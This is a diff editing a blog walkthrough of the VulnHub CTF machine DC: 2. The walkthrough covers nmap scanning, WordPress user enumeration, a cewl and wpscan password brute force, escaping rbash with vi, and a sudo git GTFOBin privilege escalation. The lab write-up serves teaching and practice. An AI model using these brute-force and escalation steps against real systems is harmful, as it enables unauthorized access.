@@ -7,10 +7,9 @@ tags: [dc, local privilege escalation, rbash, wordpress]
 ---
 
 ## Information
-DC: 2 is the second box on the VulnHub series *DC* by [DCAU][DCAU]. It starts off with a simple Wordpress website and 
-moves on to escaping `rbash` on a `SSH`. There are five flags available but flags 1 through 4 exist to give you hints 
-on what to do next to capture the next flag. As a result, this writeup will only talk about how to capture the root 
-flag only.
+DC: 2 is the second box on the VulnHub series *DC* by [DCAU][DCAU]. There are 5 flags available but flags 1 through 4 
+exist to give you hints on what to do next to capture the next flag. As a result, this writeup will only talk about how 
+to capture the root flag only.
 
 ## Tasks
 - Capture the root flag
@@ -22,24 +21,12 @@ flag only.
 - Use `vi` and `export PATH` to escape `rbash`
 - Use `git`s `GTFOBin` to access escalate privileges to `root`
  
-## Tools Used
-- `nmap`
-- `wpscan`
-- `cewl`
-- `ssh`
-- `vi`
-- `LinEnum`
-- `git`
-
 ## Walkthrough
 ### nmap
 We start off with a basic `nmap` scan.
 
 ```
 $ nmap -sC -sV 192.168.2.190
-
-[...]
-
 PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
 |_http-generator: WordPress 4.7.10
@@ -53,8 +40,6 @@ PORT     STATE SERVICE VERSION
 |_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
 MAC Address: 18:D6:C7:B8:FD:A1 (Tp-link Technologies)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-[...]
 ```
 
 `nmap` shows that we have `HTTP` on Port 80 and `SSH` on Port 7744.
@@ -69,20 +54,6 @@ result we'll be using `wpscan` to check for vulnerabilities in the system while 
 
 ```
 $ wpscan --url http://dc-2/ -e u
-_______________________________________________________________
-        __          _______   _____
-        \ \        / /  __ \ / ____|
-         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-           \  /\  /  | |     ____) | (__| (_| | | | |
-            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-        WordPress Security Scanner by the WPScan Team
-                       Version 3.5.4
-          Sponsored by Sucuri - https://sucuri.net
-      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
-_______________________________________________________________
-
 [+] URL: http://dc-2/
 
 Interesting Finding(s):
@@ -139,21 +110,6 @@ Brute Forcing Author IDs - Time: 00:00:01 <=====================================
 $ cewl http://dc-2/ -w cewl.txt
 
 $ wpscan --url http://dc-2/ --passwords cewl.txt --usernames usernames.txt
-_______________________________________________________________
-        __          _______   _____
-        \ \        / /  __ \ / ____|
-         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-           \  /\  /  | |     ____) | (__| (_| | | | |
-            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-
-        WordPress Security Scanner by the WPScan Team
-                       Version 3.5.4
-          Sponsored by Sucuri - https://sucuri.net
-      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
-_______________________________________________________________
-
 [...]
 
 [+] Enumerating Config Backups (via Passive and Aggressive Methods)
@@ -205,6 +161,7 @@ tom@DC-2:~$ vi
 ::shell
 
 tom@DC-2:~$ cd /tmp
+
 tom@DC-2:~$ pwd
 /tmp
 
@@ -229,7 +186,7 @@ got earlier and attempt to run the `GTFOBin` again.
 ```
 $ sudo git -p help config
 [sudo] password for tom: 
-tom is not in the sudoers file.  This incident will be reported.
+tom is not in the sudoers file. This incident will be reported.
 
 $ su - jerry
 Password:
@@ -281,6 +238,6 @@ If you enjoyed this CTF, send me a tweet via @DCAU7.
 
 And by that, we've captured the `root` flag.
 
-[DCAU]: https://twitter.com/DCAU7
-[Wordpress - Homepage]: /images/posts/2019-07-12-vulnhub-dc_2/Wordpress%20-%20Homepage.png
-[GTFOBin]: https://gtfobins.github.io/gtfobins/git/#sudo
+[DCAU]:                     https://twitter.com/DCAU7
+[Wordpress - Homepage]:     /images/posts/2019-07-12-vulnhub-dc_2/Wordpress%20-%20Homepage.png
+[GTFOBin]:                  https://gtfobins.github.io/gtfobins/git/#sudo
